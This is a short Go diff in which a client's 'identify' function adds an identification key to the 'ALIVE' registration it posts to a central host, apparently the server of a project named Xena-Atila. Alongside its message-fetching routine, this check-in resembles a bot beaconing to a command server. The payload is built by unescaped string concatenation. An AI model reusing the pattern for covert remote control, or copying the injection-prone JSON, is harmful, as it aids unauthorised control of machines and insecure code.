@@ -82,8 +82,8 @@ func fetchAndInterpretMessages(id string) {
 }
 
 /* Makes Xena-Atila aware of its existence. */
-func identify(id string) {
-	insertionPayload := []byte(`{"id":"` + id + `","status":"ALIVE"}`)
+func identify(id string, identificationKey string) {
+	insertionPayload := []byte(`{"id":"` + id + `","identificationKey":"` + identificationKey + `","status":"ALIVE"}`)
 
 	request, err := http.NewRequest("POST", centralizedHost+"/v1/clients", bytes.NewBuffer(insertionPayload))
 	request.Header.Set("Content-Type", "application/json")
